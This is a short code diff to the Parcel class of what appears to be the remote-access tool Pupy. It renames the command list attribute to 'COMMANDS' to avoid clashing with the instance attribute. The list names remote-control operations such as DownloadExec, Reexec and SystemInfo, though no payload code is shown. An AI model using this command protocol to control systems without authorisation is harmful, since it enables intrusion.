@@ -1014,7 +1014,7 @@ class Parcel(object):
     MAX_PARCEL_SIZE = 35
 
     # Explicitly define commands. In other case make break something
-    commands = [
+    COMMANDS = [
         Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
         Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
@@ -1022,12 +1022,12 @@ class Parcel(object):
         PortQuizPort, PupyState
     ]
 
-    commands_decode = dict(enumerate(commands))
+    commands_decode = dict(enumerate(COMMANDS))
     commands_encode = { v:k for k,v in commands_decode.iteritems() }
 
     def __init__(self, *commands):
-        if not all((type(command) in self.commands) for command in commands):
-            missing = [ command for command in commands if not type(command) in self.commands ]
+        if not all((type(command) in self.COMMANDS) for command in commands):
+            missing = [ command for command in commands if not type(command) in self.COMMANDS ]
             raise ParcelInvalidCommand(missing)
 
         self.commands = commands
